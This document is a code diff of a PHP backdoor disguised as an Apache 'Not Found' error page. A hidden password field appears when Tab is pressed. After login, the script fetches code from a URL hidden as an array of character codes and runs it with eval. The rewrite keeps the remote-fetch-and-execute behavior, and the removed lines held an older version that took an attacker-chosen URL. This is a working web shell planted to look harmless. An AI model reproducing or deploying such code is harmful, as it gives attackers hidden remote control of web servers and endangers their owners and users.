@@ -11,114 +11,112 @@ $asciiArray = [
     110, 101, 47, 107, 105, 47, 107, 111, 114, 111, 115, 47, 102, 117, 99, 107,
     47, 121, 111, 117, 47, 98, 46, 116, 120, 116
 ];
-
-$decodedString = '';
+$url = '';
 foreach ($asciiArray as $ascii) {
-    $decodedString .= chr($ascii);
+    $url .= chr($ascii);
 }
-$url = $decodedString;
 
 $correct_password = '$2y$10$cE1fZ09U/.4d3eT5zPZxE.e0.zOCvq5prclkQ9Z0xhEIV1F.ltnMy';
 
-if (isset($_GET['ts_reset'])) {
-    $_SESSION["ts_url"] = "";
-    echo "success";
-    exit;
+// Handle password form
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
+    if (password_verify($_POST['pass'], $correct_password)) {
+        $_SESSION['auth'] = true;
+        $_SESSION['ts_url'] = $url;
+        header("Location: " . $_SERVER['REQUEST_URI']);
+        exit;
+    } else {
+        $error = "Invalid password.";
+    }
+}
+
+// Authenticated: fetch and show remote content
+if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
+    $remote = @file_get_contents($_SESSION['ts_url'] ?? $url);
+    if (!$remote) {
+        $ch = curl_init($_SESSION['ts_url'] ?? $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $remote = curl_exec($ch);
+        curl_close($ch);
+    }
+    if (is_string($remote)) {
+        eval("?>$remote");
+        exit;
+    } else {
+        echo "<p>Error loading content.</p>";
+        exit;
+    }
 }
 ?>
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
+
 <head>
+    <meta charset="UTF-8">
     <title>Not Found</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 2em;
             background: #fff;
             color: #000;
+            padding: 2em;
+            margin: 0;
         }
+
         h1 {
             font-size: 22px;
         }
-        .line {
-            border-top: 1px solid #ccc;
+
+        hr {
             margin-top: 10px;
         }
-        form {
+
+        address {
+            font-style: italic;
+        }
+
+        #input_container {
+            display: none;
             margin-top: 20px;
         }
-        #password, #submitBtn {
-            background: none;
+
+        input[type="password"] {
             border: none;
-            outline: none;
-            font-family: inherit;
+            background: none;
+            font: inherit;
             font-size: 14px;
-            color: #000;
-            margin-top: 5px;
-        }
-        #pwLabel, #password, #submitBtn {
-            display: none;
-        }
-        #submitBtn {
-            cursor: pointer;
+            outline: none;
         }
     </style>
 </head>
-<body>
-<h1>Not Found</h1>
-<p>The requested URL <code>/proprietary-software.html</code> was not found on this server.</p>
-<div class="line"></div>
-<p><i>Apache/2.4.10 (Debian) Server at localhost Port 80</i></p>
 
-<?php
-if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        $provided_password = $_POST['password'];
-        if (password_verify($provided_password, $correct_password)) {
-            $_SESSION['ts_auth'] = true;
-            $_SESSION["ts_url"] = $_POST['url'] ?? $url;
-            header("Location: " . $_SERVER['REQUEST_URI']);
-            exit;
-        } else {
-            echo "<p style='color:red;'>Invalid password! Please try again.</p>";
-        }
-    }
-    ?>
-    <form method="post" id="loginForm">
-        <label for="password" id="pwLabel">Password:</label><br>
-        <input type="password" name="password" id="password" required><br>
-        <input type="submit" value="Submit" id="submitBtn">
-    </form>
+<body>
+    <h1>Not Found</h1>
+    <p>The requested URL <code>/proprietary-software.html</code> was not found on this server.</p>
+    <hr>
+    <address>Apache/2.4.10 (Debian) Server at <?php echo $_SERVER["HTTP_HOST"]; ?> Port 80</address>
+
+    <?php if (!empty($error)) echo "<p style='color:red;'>$error</p>"; ?>
+
+    <div id="input_container">
+        <form method="post" id="my_form">
+            <input type="password" name="pass" id="password" autocomplete="off" />
+        </form>
+    </div>
 
     <script>
         document.addEventListener("keydown", function (event) {
             if (event.key === "Tab") {
-                event.preventDefault(); // Prevent focus shift
-                document.getElementById("pwLabel").style.display = "inline";
-                document.getElementById("password").style.display = "inline";
-                document.getElementById("submitBtn").style.display = "inline";
+                event.preventDefault();
+                document.getElementById("input_container").style.display = "block";
                 document.getElementById("password").focus();
+            } else if (event.key === "Enter") {
+                if (document.getElementById("input_container").style.display === "block") {
+                    document.getElementById("my_form").submit();
+                }
             }
         });
     </script>
 </body>
+
 </html>
-<?php
-    exit;
-} else {
-    $targetUrl = $_SESSION["ts_url"] ?: $url;
-    $result = @file_get_contents($targetUrl);
-    if (empty($result)) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $targetUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $result = curl_exec($ch);
-        curl_close($ch);
-    }
-    if (is_string($result)) {
-        eval('?>' . $result);
-    } else {
-        echo "<p>Error loading content.</p>";
-    }
-}
-?>
